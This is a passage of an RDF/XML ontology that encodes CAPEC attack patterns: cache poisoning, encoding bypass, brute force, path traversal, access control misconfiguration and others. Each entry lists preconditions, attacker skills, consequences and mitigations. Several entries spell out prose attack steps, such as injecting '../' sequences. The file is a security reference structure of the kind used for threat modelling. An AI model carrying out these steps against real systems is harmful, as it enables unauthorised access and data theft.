        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:161::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cache Poisoning"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack259">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#141"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::348::345::349::346::441::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify and explore caches) Use tools to sniff traffic and scan a network in order to locate application&apos;s cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.TECHNIQUE:Run tools that check available entries in the cache.::STEP:2:PHASE:Experiment:DESCRIPTION:(Cause specific data to be cached) An attacker sends bogus request to the target  and then floods responses that trick a cache to remember malicious responses  which are wrong answers of queries.TECHNIQUE:Intercept or modify a query  or send a bogus query with known credentials (such as transaction ID).::STEP:3:PHASE:Exploit:DESCRIPTION:(Redirect users to malicious website) As the attacker succeeds in exploiting the vulnerability  he is able to manipulate and interpose malicious response data to targeted victim queries.TECHNIQUE:Intercept or modify a query  or send a bogus query with known credentials (such as transaction ID).:TECHNIQUE:Man-in-the-Middle intercepts secure communication between two parties.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::348::345::349::346::441::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must be able to modify the value stored in a cache to match a desired value.::The targeted application must not be able to detect the illicit modification of the cache and must trust the cache value in its calculations.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To overwrite/modify targeted cache:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker126">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#267"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack126"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::173::172::180::181::171::73::21::74::20::697::692::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application&apos;s decoder accepts and interprets encoded characters. Data canonicalization  input filtering and validating is not done properly leaving the door open to harmful characters for the target host.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker can inject different representation of a filtered character in a different encoding.:LEVEL:Low::SKILL:An attacker may craft subtle encoding of input data by using the knowledge that he/she has gathered about the target host.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker303">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#621">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:189::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Analysis of Packet Timing and Sizes"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack303">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#621"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::201::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Derive sensitive information about encrypted data.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Use of untrusted communication paths enables an attacker to intercept and log communications  including metadata such as packet timing and sizes.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:These attacks generally require sophisticated machine learning techniques and require traffic capture as a prerequisite.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker436">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#120"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack436"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::173::172::177::181::171::183::184::21::74::20::697::692::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target&apos;s filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.::The application accepts and decodes URL string request.::The application performs insufficient filtering/canonicalization on the URLs.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Tools that automate encoding of data can assist the adversary in generating encoded strings.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  an application should limit permissions to only those required and should verify the origin of all web content it loads.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack16"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use salt when computing password hashes. That is  concatenate the salt (random bits) with the original password prior to hashing it.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack269"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker19">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#499">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:117::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Intent Intercept"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack19">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#499"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::925::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::925::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application is used to intercept implicit intents.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker435">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#417"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack435"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::There are no necessary resources required for this attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Clients should only trust UDDI  ebXML  or similar messages that are verifiably signed by a trusted party.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack328"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker302">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#495"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack302"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::404::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the attacker to be able to generate fragmented IP traffic containing crafted data.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker301">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#494"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack301"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::404::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the target system to be running a vulnerable implementation of IP  and the attacker needs to ability to send TCP packets of arbitrary size with crafted data.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker434">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#624"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack434"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Physical access to the system::The adversary must be cognizant of where fault injection vulnerabilities exist in the system in order to leverage them for exploitation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Adversaries require non-trivial technical skills to create and implement fault injection attacks. Although this style of attack has become easier (commercial equipment and training classes are available to perform these attacks)  they usual require significant setup and experimentation time during which physical access to the device is required.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The relevant sensors and tools to detect and analyze fault/side-channel data from a system. A tool capable of injecting fault/side-channel data into a system or application.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Enforce principle of least privilege::Design: Backup copies of all configuration files::Implementation: Integrity monitoring for configuration files::Implementation: Enforce audit logging on code and configuration promotion procedures.::Implementation: Load configuration from separate process and memory space  for example a separate physical device like a CD::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack377"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::If possible  leverage coding language(s) that do not allow this weakness to occur (e.g.  Java  Ruby  and Python all perform automatic garbage collection that releases memory for objects that have been deallocated).::Memory should always be allocated/freed using matching functions (e.g.  malloc/free  new/delete  etc.)::Implement best practices with respect to memory management  including the freeing of all allocated resources at all exit points and ensuring consistency with how and where memory is freed in a function.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack205"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker433">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#25"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack433"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::412::567::662::833::667::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target host has a deadlock condition. There are four conditions for a deadlock to occur  known as the Coffman conditions. (R.25.3)(REF-6)::The target host exposes an API to the user.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This type of attack may be sophisticated and require knowledge about the system&apos;s resources and APIs.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Configure the access control correctly.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack253">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#180">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:122::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Exploiting Incorrectly Configured Access Control Security Levels"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::732::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey) The attacker surveys the target application  possibly as a valid and authenticated user.TECHNIQUE:Spider the web site for all available links.:TECHNIQUE:Brute force to guess all function names/action with different privileges.::STEP:2:PHASE:Experiment:DESCRIPTION:(Identify weak points in access control configurations) The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.TECHNIQUE:The attacker attempts authenticated access to targeted functions and data.:TECHNIQUE:The attacker attempts unauthenticated access to targeted functions and data.:TECHNIQUE:The attacker attempts indirect and side channel access to targeted functions and data.::STEP:3:PHASE:Exploit:DESCRIPTION:(Access the function or data bypassing the access control) The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.TECHNIQUE:The attacker executes the function or accesses the data not authorized to him.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker300">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#496"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack300"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::404::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the target system to be running a vulnerable implementation of IP  and the attacker needs to ability to send arbitrary sized ICMP packets to the target.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Passively monitor cellular network connection for real-time threat detection and logging for manual review.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack400"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Identify programs that may be used to acquire service information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack97">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#574">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Services Footprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard  ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking  it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::Do not trust input data from user. Validate all user input.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack504"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker254">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#42"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack254"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::119::74::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target system uses a mail server.::Mail server vendor has not released a patch for the MIME conversion routine  the patch itself has a security hole or does not fix the original problem  or the patch has not been applied to the user&apos;s system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:It may be trivial to cause a DoS via this attack pattern:LEVEL:Low::SKILL:Causing arbitrary code to execute on the target system.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker121">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#534"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack121"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts.:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker387">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#49"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack387"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::521::262::263::257::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary needs to know a username to target.::The system uses password based authentication as the one factor authentication mechanism.::An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:A brute force attack is very straightforward. A variety of password cracking tools are widely available.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A powerful enough computer for the job with sufficient CPU  RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker386">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#112"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack386"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::330::326::521::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must be able to determine when they have successfully guessed the secret. As such  one-time pads are immune to this type of attack since there is no way to determine when a guess is correct.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attack simply requires basic scripting ability to automate the exploration of the search space. More sophisticated attackers may be able to use more advanced methods to reduce the search space and increase the speed with which the secret is located.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. Ultimately  the speed with which an attacker discovers a secret is directly proportional to the computational resources the attacker has at their disposal. This attack method is resource expensive: having large amounts of computational power do not guarantee timely success  but having only minimal resources makes the problem intractable against all but the weakest secret selection procedures.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker253">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#180"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack253"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::732::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must apply access controls  but incorrectly configure them. However  not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality  then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker&apos;s access and it no longer does so. If the incorrect configuration applies too much security  it must prevent legitimate activity and the attacker must be able to force others to require this activity..::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:In order to discover unrestricted resources  the attacker does not need special tools or skills. He only has to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::File extensions should be checked to see if non-visible characters are being included.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack26"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker120">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#589"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack120"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::300::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that application handles situations where access to APIs in external libraries is not available securely. If the application cannot continue its execution safely it should fail in a consistent and secure fashion.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack209"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker90">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#162"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack90"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::602::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted site must contain hidden fields to be modified.::The targeted site must not validate the hidden fields with backend processing.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must have the ability to modify hidden fields by editing the HTTP response to the server.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker385">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#39"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack385"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::353::285::302::472::565::315::539::384::233::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An attacker already has some access to the system or can steal the client based data tokens from another user who has access to the system.::For an Attacker to viably execute this attack  some data (later interpreted by the application) must be held client-side in a way that can be manipulated without detection. This means that the data or tokens are not CRCd as part of their value or through a separate meta-data store elsewhere.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:If the client site token is obfuscated.:LEVEL:Medium::SKILL:If the client site token is encrypted.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins  such as Tamper Data for Firefox  may help in manipulating URL- or cookie-based data.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker252">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#139">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:126::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Relative Path Traversal"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack252">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#139"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::23::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey application) Using a browser or an automated tool  an attacker follows all public links on a web site. He records all the links he finds. He picks out the URL parameters that may related to access to files.TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser&apos;s plug-in are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt variations on input parameters) Possibly using an automated tool  an attacker requests variations on the identified inputs. He sends parameters that include variations of payloads.TECHNIQUE:Use a list of probe strings as path traversal payload. Different strings may be used for different platforms. Strings contain relative path sequences such as ../.:TECHNIQUE:Use a proxy tool to record results of manual input of relative path traversal probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:(Access  modify  or execute arbitrary files.) An attacker injects path traversal syntax into identified vulnerable inputs to cause inappropriate reading  writing or execution of files. An attacker could be able to read directories or files which they are normally not allowed to read. The attacker could also access data outside the web document root  or include scripts  source code and other kinds of files from external websites. Once the attacker accesses arbitrary files  he/she could also modify files. In particular situations  the attacker could also execute arbitrary code or system commands.TECHNIQUE:Manipulate file and its path by injecting relative path sequences (e.g. ../).:TECHNIQUE:Download files  modify files  or try to execute shell commands (with binary files).::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Access ControlTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::23::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must accept a string as user input  fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation  and insert the user-supplied string into path navigation commands.::"/>
    </j.0:precondition>
